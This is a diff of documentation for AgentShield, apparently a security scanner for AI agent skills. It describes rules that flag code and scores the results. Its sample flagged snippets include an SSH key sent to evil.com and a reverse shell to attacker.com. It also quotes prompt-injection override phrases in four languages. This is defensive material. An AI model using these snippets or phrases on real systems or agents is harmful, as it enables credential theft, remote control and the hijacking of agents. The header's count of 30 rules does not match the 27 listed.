@@ -1,165 +1,143 @@
 # Security Rules Reference
 
-AgentShield ships with 15 built-in security rules. Each rule is described below with examples and remediation advice.
+AgentShield v0.4.x ships with **30 built-in security rules** organized into three risk tiers. Each rule is described below with examples and remediation advice.
 
 ---
 
-## 🔴 Critical Rules
+## 🔴 High Risk (6 rules) — -25 points each
 
 ### `data-exfil` — Data Exfiltration
 **Detects:** Code that reads sensitive files (SSH keys, credentials, configs) AND sends HTTP requests in the same file.
 
-**Example (flagged):**
 ```javascript
 const key = fs.readFileSync("~/.ssh/id_rsa");
 fetch("https://evil.com/collect", { body: key });
 ```
 
-**Fix:** Separate data reading from network calls. If both are needed, audit the destination URL and ensure secrets are never sent externally.
-
----
+**Fix:** Separate data reading from network calls. Audit destination URLs.
 
 ### `backdoor` — Dynamic Code Execution
 **Detects:** `eval()`, `new Function()`, `child_process.exec()` with dynamic strings, `os.system()`, `subprocess` with `shell=True`.
 
-**Example (flagged):**
 ```javascript
 const payload = getRemotePayload();
 eval(payload);
 ```
 
-**Fix:** Replace `eval()` with `JSON.parse()` for data. Use `execFile()` instead of `exec()`. Avoid `shell: true` in `spawn()`.
-
----
+**Fix:** Replace `eval()` with `JSON.parse()`. Use `execFile()` instead of `exec()`.
 
 ### `reverse-shell` — Reverse Shell
-**Detects:** Outbound socket connections piped to a shell process (`/bin/sh`, `/bin/bash`).
+**Detects:** Outbound socket connections piped to a shell process.
 
-**Example (flagged):**
 ```javascript
-const net = require("net");
-const { exec } = require("child_process");
 const socket = net.connect(4444, "attacker.com");
 socket.pipe(exec("/bin/sh").stdin);
 ```
 
-**Fix:** Remove any socket-to-shell piping. Legitimate network code should never spawn a shell from a socket connection.
-
----
-
 ### `crypto-mining` — Cryptocurrency Mining
-**Detects:** Mining pool connections (`stratum://`, `pool.` domains), known miners (xmrig, coinhive), and WebAssembly crypto patterns.
-
-**Example (flagged):**
-```javascript
-const pool = "stratum+tcp://pool.minexmr.com:4444";
-```
-
-**Fix:** Remove all mining-related code. If you need legitimate crypto operations, document them clearly.
-
----
+**Detects:** Mining pool connections (`stratum://`), known miners (xmrig, coinhive), WebAssembly crypto patterns.
 
 ### `credential-hardcode` — Hardcoded Credentials
-**Detects:** AWS access keys (`AKIA...`), GitHub PATs (`ghp_...`), Stripe keys (`sk_live_...`), and private key blocks in code.
-
-**Example (flagged):**
-```javascript
-const API_KEY = "ghp_1234567890abcdef1234567890abcdef12345678";
-```
-
-**Fix:** Use environment variables or a secrets manager. Never commit credentials to source code.
-
----
-
-### `env-leak` — Environment Variable Exfiltration
-**Detects:** Code that accesses `process.env` (especially secrets/tokens) AND makes outbound HTTP requests.
-
-**Example (flagged):**
-```javascript
-const secret = process.env.API_SECRET;
-fetch("https://example.com/log", { body: secret });
-```
-
-**Fix:** Audit which env vars are accessed and where they're sent. Secrets should never leave the process boundary.
-
----
+**Detects:** AWS access keys (`AKIA...`), GitHub PATs (`ghp_...`), Stripe keys (`sk_live_...`), private key blocks.
 
 ### `obfuscation` — Code Obfuscation
-**Detects:** Base64-encoded strings fed to `eval(atob(...))`, hex-encoded strings, `String.fromCharCode()` with many arguments, and JS obfuscator patterns.
-
-**Example (flagged):**
-```javascript
-eval(atob("Y29uc29sZS5sb2coInB3bmVkIik="));
-```
-
-**Fix:** Decode and review any obfuscated code. Legitimate skills should have readable source code.
+**Detects:** `eval(atob(...))`, hex chains, `String.fromCharCode()` obfuscation, JS obfuscator patterns.
 
 ---
 
-### `typosquatting` — Dependency Typosquatting
-**Detects:** npm dependencies with names suspiciously similar to popular packages (e.g., `1odash` → `lodash`, `axois` → `axios`).
+## 🟡 Medium Risk (14 rules) — -8 points each
 
-**Example (flagged):**
-```json
-{ "dependencies": { "1odash": "^4.0.0" } }
+### `prompt-injection` — Prompt Injection (55+ patterns)
+**Detects:** Instruction override, identity manipulation, system prompt extraction, hidden instructions (TPA tags, HTML comments, zero-width chars), tool poisoning, data exfiltration via markdown, encoding evasion.
+
+Based on research from [Invariant Labs TPA](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks), [BIPIA (KDD 2025)](https://arxiv.org/abs/2312.14197).
+
+### `multilang-injection` — Multi-Language Prompt Injection 🆕
+**Detects:** Prompt injection in 8 languages: Chinese (中文), Japanese (日本語), Korean (한국어), Russian (Русский), Arabic (العربية), Spanish, French, German.
+
+```
+忽略上面的指令 → Chinese injection
+前の指示を無視 → Japanese injection
+이전의 지시를 무시 → Korean injection
+Игнорируй инструкции → Russian injection
 ```
 
-**Fix:** Verify package names match the official packages. Use `npm info <package>` to confirm.
+### `tool-shadowing` — Tool Override Attacks
+**Detects:** Cross-server tool name conflicts, tool override/replacement patterns.
 
----
-
-### `hidden-files` — Exposed Secret Files
-**Detects:** `.env` files containing passwords, API keys, tokens, or secrets committed to the repo.
-
-**Example (flagged):**
-```
-# .env
-DATABASE_PASSWORD=supersecret123
-STRIPE_KEY=sk_live_abc123
-```
-
-**Fix:** Add `.env` to `.gitignore`. Use `.env.example` with placeholder values.
-
----
-
-## 🟡 Warning Rules
+### `env-leak` — Environment Variable Exfiltration
+**Detects:** `process.env` secrets + outbound HTTP requests.
 
 ### `network-ssrf` — Server-Side Request Forgery
-**Detects:** User input flowing into fetch/request URLs, access to AWS metadata endpoint (`169.254.169.254`), and internal IP ranges in URLs.
+**Detects:** User-controlled URLs in fetch, AWS metadata endpoint access (`169.254.169.254`).
 
-**Fix:** Validate and allowlist URLs before making requests. Block internal IPs and metadata endpoints.
+### `phone-home` — Beacon/C2 Heartbeat
+**Detects:** Periodic timers (`setInterval`, cron) + outbound HTTP requests.
+
+### `toxic-flow` — Cross-Tool Data Leaks
+**Detects:** TF001 (cross-tool data leak flows) and TF002 (destructive flows).
+
+### `skill-risks` — Skill Risk Patterns
+**Detects:** Financial operations, untrusted content handling, external dependencies, credential handling.
+
+### `python-security` — Python Security (35 patterns, 10 categories)
+**Detects:** eval/exec, pickle deserialization, subprocess injection, SQL injection, SSTI, path traversal, YAML unsafe load, weak crypto, hardcoded secrets, dangerous imports.
+
+### `cross-file` — Cross-File Correlation Analysis 🆕
+**Detects:** Data flow across files (File A reads secrets → File B sends HTTP), code injection chains, capability mismatches between manifest and code.
+
+### `attack-chain` — Multi-Step Kill Chain Detection 🆕
+**Detects:** Complete attack sequences: Reconnaissance → Access → Collection → Exfiltration → Persistence.
+
+### `description-integrity` — Description-Code Integrity 🆕
+**Detects:** Semantic mismatch between tool descriptions and actual code behavior. "Read-only calculator" that makes network requests, "local only" tool that sends emails.
+
+### `mcp-runtime` — MCP Runtime Security 🆕
+**Detects:** Dangerous MCP server commands (--inspect, python -c), sensitive env exposure, non-HTTPS remote URLs, tool count explosion (>20), cross-server tool name conflicts, schema validation issues.
+
+### `python-ast` — Python AST Taint Tracking 🆕
+**Detects:** Tainted data flow from user input to dangerous sinks (eval, exec, subprocess, SQL, pickle, yaml) using Python's `ast` module. Distinguishes safe literals from tainted variables.
 
 ---
+
+## 🟢 Low Risk (7 rules) — -2 points each
 
 ### `privilege` — Permission Mismatch
-**Detects:** Discrepancies between SKILL.md declared permissions and actual code behavior (e.g., declares `read` but uses `child_process.exec()`).
-
-**Fix:** Update SKILL.md to accurately reflect all capabilities used, or remove unnecessary API calls.
-
----
+**Detects:** SKILL.md declared permissions vs actual code behavior mismatch.
 
 ### `supply-chain` — Known CVEs
 **Detects:** Known vulnerabilities in npm dependencies via `npm audit`.
 
-**Fix:** Run `npm audit fix` or update vulnerable packages to patched versions.
-
----
-
 ### `sensitive-read` — Sensitive File Access
-**Detects:** Code that reads SSH keys, AWS credentials, kubeconfig, Docker config, npm tokens, etc.
-
-**Fix:** Only access credentials that are necessary. Document why access is needed in SKILL.md.
-
----
+**Detects:** Access to `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.kube/config`.
 
 ### `excessive-perms` — Excessive Permissions
-**Detects:** SKILL.md requesting more than 5 permissions, or requesting dangerous permissions (`exec`, `write`, `network`, `browser`) without apparent code use.
+**Detects:** Too many or dangerous permissions in SKILL.md.
 
-**Fix:** Request only the minimum permissions needed. Split complex skills into smaller, focused ones.
+### `mcp-manifest` — MCP Manifest Issues
+**Detects:** Wildcard permissions, undeclared capabilities, suspicious tool definitions.
+
+### `typosquatting` — Dependency Typosquatting
+**Detects:** Suspicious npm names: `1odash` → `lodash`, `axois` → `axios`.
+
+### `hidden-files` — Exposed Secret Files
+**Detects:** `.env` files with `PASSWORD`, `SECRET`, `API_KEY` committed to repo.
 
 ---
 
-### `phone-home` — Beacon/Heartbeat
-**Detects:** Periodic timers (`setInterval`, cron) combined with outbound HTTP requests — a common telemetry/C2 pattern.
+## Scoring
 
-**Fix:** If telemetry is legitimate, document it clearly. Remove any undisclosed periodic network communication.
+| Severity | Points Deducted |
+|----------|----------------|
+| 🔴 High | -25 |
+| 🟡 Medium | -8 |
+| 🟢 Low | -2 |
+
+False-positive-flagged findings are excluded from scoring.
+
+| Score | Risk Level |
+|-------|------------|
+| 90-100 | ✅ Low Risk — safe to install |
+| 70-89 | 🟡 Moderate — review warnings |
+| 40-69 | 🟠 High Risk — investigate before using |
+| 0-39 | 🔴 Critical — do not install |
